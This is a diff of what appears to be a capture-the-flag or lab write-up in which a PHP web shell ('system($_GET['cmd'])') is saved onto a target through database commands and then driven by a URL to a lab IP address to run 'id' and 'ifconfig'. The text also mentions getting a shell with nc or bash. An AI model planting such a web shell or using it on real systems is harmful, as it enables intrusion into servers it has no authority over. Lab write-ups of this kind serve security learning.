@@ -64,4 +64,8 @@ We can then add in a php get variable web shell:
 	set test "<?php system($_GET['cmd']); ?>"
 	save
 
-Using this, we can further enumerate and maybe get credentials or a shell using nc or bash. 
+Using this, we can run system commands using:
+	
+	http://10.10.206.170/shell.php?cmd=id;ifconfig
+
+This lets us further enumerate and maybe get credentials or a shell using nc or bash. 
